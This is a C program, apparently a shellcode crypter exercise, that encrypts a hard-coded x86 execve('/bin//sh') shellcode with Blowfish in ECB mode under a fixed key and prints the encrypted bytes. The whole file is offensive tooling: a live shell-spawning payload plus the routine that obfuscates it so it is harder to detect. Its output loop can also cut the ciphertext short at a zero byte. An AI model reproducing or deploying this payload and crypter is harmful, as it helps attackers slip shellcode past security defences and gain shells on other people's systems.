#include <stdio.h>
#include <openssl/blowfish.h>
#include <string.h>

//based on:
//https://stackoverflow.com/questions/20133502/encrypting-and-decrypting-a-message-with-blowfish
//gcc blow.c -o blow -lcrypto

int main(){

BF_KEY *key = malloc(sizeof(BF_KEY));
unsigned char *encryption_key = "KeyOfMemories";
const unsigned char *original = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

printf("Original Shellcode\n");
unsigned char *tmpin = original;
while(*tmpin){
printf("\\x%02x",*tmpin++);
}

size_t Original_size = strlen(original) + 1;
printf("\nOrginial Shellcode Size: %i\n",Original_size);
int Key_Length = strlen(encryption_key);
size_t Rez_size = (Original_size + 7) & (~7);
unsigned char *Encrypted_shellcode = malloc(Rez_size);
unsigned char *chunk = Encrypted_shellcode;

//Defining key
BF_set_key(key, Key_Length, encryption_key);


//Encryption	BF_ecb_encrypt(const unsigned char *in, unsigned char *out,BF_KEY *key, int enc);
while (Original_size >= 8) {    
  BF_ecb_encrypt(original, chunk, key, BF_ENCRYPT);
  original += 8;
  chunk += 8;
  Original_size -= 8;
}
if (Original_size > 0) {  
  unsigned char buffer[8];
  memcpy(buffer, original, Original_size);
  int i;
  for (i=Original_size; i<8; i++) {
    buffer[i] = rand();
  }  
  BF_ecb_encrypt(buffer, chunk, key, BF_ENCRYPT);
}


printf("\nEncrypted Shellcode:\n");
unsigned char *tmp = Encrypted_shellcode;
while(*tmp){
fprintf(stdout,"\\x%02x",*tmp++);
}
printf("\n");


}
